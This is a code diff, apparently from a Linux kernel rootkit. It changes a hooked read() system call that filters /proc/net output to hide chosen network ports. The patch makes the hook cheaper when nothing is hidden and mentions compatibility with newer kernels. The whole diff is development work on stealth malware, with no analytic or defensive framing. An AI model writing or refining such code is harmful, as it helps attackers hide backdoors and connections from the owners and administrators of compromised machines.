@@ -215,6 +215,13 @@ asmlinkage long hooked_read(const struct pt_regs *regs) {
 
     orig_read = (void *)hooks[HOOKIDX_READ].original;
 
+    /* Hot path: read() is the most common syscall on the system.
+     * When nothing is hidden, bail out BEFORE touching the fd table —
+     * v3.2 paid a fdget()/fdput() + dentry strcmp on every read()
+     * system-wide even with an empty hide-list. */
+    if (hidden_port_count == 0)
+        return orig_read(regs);
+
     /* Check if this fd is a /proc/net file we care about.
      * Since v6.12 `struct fd` hides its member behind the fd_file()
      * accessor — use it when available, fall back to f.file. */
@@ -243,9 +250,6 @@ asmlinkage long hooked_read(const struct pt_regs *regs) {
         !is_net_file) {
         return orig_read(regs);
     }
-
-    if (hidden_port_count == 0)
-        return orig_read(regs);
 
     ret = orig_read(regs);
     if (ret <= 0)
